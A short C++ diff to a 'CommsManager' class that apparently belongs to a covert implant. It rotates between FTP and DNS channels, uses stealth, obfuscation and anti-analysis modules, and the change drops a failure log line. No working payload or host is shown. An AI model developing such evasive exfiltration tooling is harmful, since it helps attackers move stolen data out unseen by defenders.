@@ -6,7 +6,6 @@
 #include "communication/FtpComms.h" 
 #include "communication/DnsComms.h"
 #include "security/StealthComms.h"
-#include "security/AntiAnalysis.h"
 #include "security/Obfuscation.h"
 #include "core/Logger.h"
 #include "core/Configuration.h"
@@ -23,7 +22,6 @@
 
 #include "Encryption.h"
 
-// Fix: Remove constexpr and use regular string literal or static const
 static const std::string OBF_COMMS_MANAGER = OBFUSCATE("CommsManager");
 
 CommsManager::CommsManager(Configuration* config)
@@ -134,7 +132,6 @@ bool CommsManager::TransmitData(const std::vector<uint8_t>& data) {
     bool success = m_currentMethod->SendData(securedData);
     
     if (!success) {
-        LOG_WARN("Primary transmission failed, attempting rotation");
         RotateCommsMethod();
         if (m_currentMethod) {
             success = m_currentMethod->SendData(securedData);
